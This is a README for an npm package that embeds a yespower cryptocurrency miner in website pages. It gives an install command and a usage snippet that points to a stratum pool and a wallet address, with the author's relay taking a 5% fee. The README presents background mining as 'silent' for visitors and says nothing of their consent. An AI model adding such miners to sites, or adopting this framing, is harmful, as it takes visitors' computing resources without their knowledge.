# yespower-web
Start monetizing your website with lightweight crypto mining.
## Why mining
Cryptos have a place in the website monetization. I think that a lightweight crypto mining can replace the intrusive ads that slow down the website loading. Mining is silent and transparent for the user. It works in background and keeps the website loading fast.
## Yespower
The implemented miner uses [yespower](https://www.openwall.com/yespower/) as hashing algorithm so you can mine all PoW cryptos using this function. Yespower is CPU friendly and GPU unfriendly so it is profitable using only CPU.
## How it works
The miner communicates with stratum server through a WebSocket server owned by me. This server operates as a stratum client and opens a connection to the stratum server.
### Fee
Maintaining the WebSocket server has a cost so I take 5% of shares as fee.
## Install
```
npm i @marco_ciaramella/yespower-web
```
## Usage
For each html file add a script code like this
```javascript
import * as yespower from "@marco_ciaramella/yespower-web";

try {
    yespower.mine({
        // required
        stratum: {
            server: "eu.onyx.run",
            port: 3031,
            worker: "oKR94TokcqpbeXJmkwakpPC251Tck39Uy4",
            password: "x"
        },
        // optional
        options: {
            log: true // enables/disables logs
        }
    });
} catch (error) {
    console.error(error);
}
```
## Test
You can verify if your browser runs the miner by visiting this [page](https://websocket-stratum-server.com/test).